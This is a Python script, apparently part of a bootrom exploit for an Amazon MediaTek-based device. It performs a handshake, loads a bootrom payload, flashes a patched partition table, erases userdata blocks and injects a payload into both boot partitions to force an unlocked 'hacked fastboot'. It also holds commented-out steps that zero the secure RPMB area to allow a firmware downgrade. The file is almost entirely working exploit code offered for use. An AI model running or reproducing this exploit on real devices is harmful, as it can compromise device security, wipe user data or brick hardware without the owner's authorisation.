import struct

from common import Device
from handshake import handshake
from load_payload import load_payload
from logger import log

def switch_boot0(dev):
    dev.emmc_switch(1)
    block = dev.emmc_read(0)
    if block[0:9] != b"EMMC_BOOT":
        dev.reboot()
        raise RuntimeError("what's wrong with your BOOT0?")

def flash_binary(dev, path, start_block, max_size=0):
    with open(path, "rb") as fin:
        data = fin.read()
    while len(data) % 0x200 != 0:
        data += b"\x00"

    if max_size and len(data) > max_size:
        raise RuntimeError("data too big to flash")

    blocks = len(data) // 0x200
    for x in range(blocks):
        print("[{} / {}]".format(x + 1, blocks), end='\r')
        dev.emmc_write(start_block + x, data[x * 0x200:(x + 1) * 0x200])
    print("")

def dump_binary(dev, path, start_block, max_size=0):
    with open(path, "w+b") as fout:
        blocks = max_size // 0x200
        for x in range(blocks):
            print("[{} / {}]".format(x + 1, blocks), end='\r')
            fout.write(dev.emmc_read(start_block + x))
    print("")

def force_fastboot(dev, gpt):
    switch_user(dev)
    block = list(dev.emmc_read(gpt["misc"][0]))
    block[0:12] = "boot-amonet\x00".encode("utf-8")
    dev.emmc_write(gpt["misc"][0], bytes(block))

#NOTE: This doesn't actually wipe userdata, it just erases the first 10 blocks.
#      A new filesystem should be created at next boot.
def wipe_userdata(dev, gpt):
    switch_user(dev)
    block = b"\x00" * 0x200
    for x in range(0, 10):
        dev.emmc_write(gpt["userdata"][0] + x, block)

def switch_user(dev):
    dev.emmc_switch(0)
    block = dev.emmc_read(0)
    if block[510:512] != b"\x55\xAA":
        dev.reboot()
        raise RuntimeError("what's wrong with your GPT?")

def parse_gpt(dev):
    data = dev.emmc_read(0x400 // 0x200) + dev.emmc_read(0x600 // 0x200) + dev.emmc_read(0x800 // 0x200) + dev.emmc_read(0xA00 // 0x200) + dev.emmc_read(0xC00 // 0x200)
    num = len(data) // 0x80
    parts = dict()
    for x in range(num):
        part = data[x * 0x80:(x + 1) * 0x80]
        part_name = part[0x38:].decode("utf-16le").rstrip("\x00")
        part_start = struct.unpack("<Q", part[0x20:0x28])[0]
        part_end = struct.unpack("<Q", part[0x28:0x30])[0]
        parts[part_name] = (part_start, part_end - part_start + 1)
    return parts

def main():
    dev = Device()
    dev.find_device()

    # 0.1) Handshake
    handshake(dev)

    # 0.2) Load brom payload
    load_payload(dev, "../brom-payload/build/payload.bin")

    # 1) Sanity check GPT
    log("Check GPT")
    switch_user(dev)

    # 1.1) Parse gpt
    gpt = parse_gpt(dev)
    log("gpt_parsed = {}".format(gpt))
    if "lk_a" not in gpt or "tee1" not in gpt or "boot_a" not in gpt or "recovery" not in gpt:
        raise RuntimeError("bad gpt")

    if "boot_aa" not in gpt or "boot_bb" not in gpt:
        log("Flash new GPT")
        flash_binary(dev, "../bin/gpt.patched.bin", 0, 0x800 * 0x200)
        gpt = parse_gpt(dev)
        log("gpt_parsed = {}".format(gpt))
        if "boot_aa" not in gpt or "boot_bb" not in gpt:
            raise RuntimeError("bad gpt")
        log("Wipe userdata")
        wipe_userdata(dev, gpt)

    # 2) Sanity check boot0
    log("Check boot0")
    switch_boot0(dev)

    # 3) Sanity check rpmb
    log("Check rpmb")
    rpmb = dev.rpmb_read()
    if rpmb[0:4] != b"AMZN":
        log("rpmb looks broken; if this is expected (i.e. you're retrying the exploit) press enter, otherwise terminate with Ctrl+C")
        input()

#    # 4) Zero out rpmb to enable downgrade
#    log("Downgrade rpmb")
#    dev.rpmb_write(b"\x00" * 0x100)
#    log("Recheck rpmb")
#    rpmb = dev.rpmb_read()
#    if rpmb != b"\x00" * 0x100:
#        dev.reboot()
#        raise RuntimeError("downgrade failure, giving up")
#    log("rpmb downgrade ok")
#
#    # 6) Downgrade preloader
#    log("Flash preloader")
#    switch_boot0(dev)
#    #flash_binary(dev, "../bin/preloader.img", 0)
#
#    # 7) Downgrade tz
#    log("Flash tz")
#    switch_user(dev)
#    #flash_binary(dev, "../bin/tz.img", gpt["tee1"][0], gpt["tee1"][1] * 0x200)
#
#    # 8) Downgrade lk
#    log("Flash lk")
#    switch_user(dev)
#    flash_binary(dev, "../bin/lk.bin", gpt["lk_a"][0], gpt["lk_a"][1] * 0x200)
#    flash_binary(dev, "../bin/lk.bin", gpt["lk_b"][0], gpt["lk_b"][1] * 0x200)

    # 9) Flash microloader
    log("Inject payload")
    switch_user(dev)
    flash_binary(dev, "../bin/boot.hdr", gpt["boot_a"][0], gpt["boot_a"][1] * 0x200)
    #flash_binary(dev, "../bin/boot.hdr.fb", gpt["boot_a"][0], gpt["boot_a"][1] * 0x200)
    flash_binary(dev, "../bin/boot.payload", gpt["boot_a"][0] + 0x367F7, (gpt["boot_a"][1] * 0x200) - (0x367F7 * 0x200))

    switch_user(dev)
    flash_binary(dev, "../bin/boot.hdr", gpt["boot_b"][0], gpt["boot_b"][1] * 0x200)
    #flash_binary(dev, "../bin/boot.hdr.fb", gpt["boot_b"][0], gpt["boot_b"][1] * 0x200)
    flash_binary(dev, "../bin/boot.payload", gpt["boot_b"][0] + 0x367F7, (gpt["boot_b"][1] * 0x200) - (0x367F7 * 0x200))

    #flash_binary(dev, "../echo-dot-new-bins/misc.img", gpt["misc"][0], gpt["misc"][1] * 0x200)
    log("Enable hacked fastboot for next boot")
    force_fastboot(dev, gpt)

    # Reboot (to fastboot)
    log("Reboot to unlocked fastboot")
    dev.reboot()


if __name__ == "__main__":
    main()
